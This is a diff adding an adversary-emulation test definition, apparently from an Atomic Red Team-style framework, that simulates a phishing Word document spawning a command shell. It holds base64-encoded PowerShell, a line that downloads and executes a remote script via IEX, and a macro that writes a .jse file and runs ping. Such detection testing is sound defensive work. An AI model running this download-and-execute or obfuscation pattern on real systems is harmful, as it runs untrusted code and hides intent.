@@ -1,0 +1,23 @@
+- id: 1fca0539-397a-5987-93c0-dcc81d8d3dfb
+  name: Soumaia ART Tests - Word spawned a command shell and used an IP address in the command line
+  description: 'Word spawning a command prompt then running a command with an IP address in the command line is an indicator of malicious activity.
+
+    Upon execution, CMD will be launched and ping 8.8.8.8.'
+  tactic: initial-access
+  technique:
+    attack_id: T1566.001
+    name: 'Phishing: Spearphishing Attachment'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand dAByAHkAIAB7AAoAIAAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMATwBNAE8AYgBqAGUAYwB0ACAAIgBXAG8AcgBkAC4AQQBwAHAAbABpAGMAYQB0AGkAbwBuACIAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAIAAgACQAcAByAG8AYwBlAHMAcwAgAD0AIAAiAFcAbwByAGQAIgA7ACAAaQBmACAAKAAgACQAcAByAG8AYwBlAHMAcwAgAC0AZQBxACAAIgBXAG8AcgBkACIAKQAgAHsAJABwAHIAbwBjAGUAcwBzACAAPQAgACIAdwBpAG4AdwBvAHIAZAAiAH0ACgAgACAAUwB0AG8AcAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIAAkAHAAcgBvAGMAZQBzAHMACgAgACAAZQB4AGkAdAAgADAACgB9ACAAYwBhAHQAYwBoACAAewAgAGUAeABpAHQAIAAxACAAfQAKAA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAFcAbwByAGQAIABtAGEAbgB1AGEAbABsAHkAIAB0AG8AIABtAGUAZQB0ACAAdABoAGkAcwAgAHIAZQBxAHUAaQByAGUAbQBlAG4AdAAiAAoA
+          }
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+          $macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
+          Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
+        cleanup: |-
+          Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore
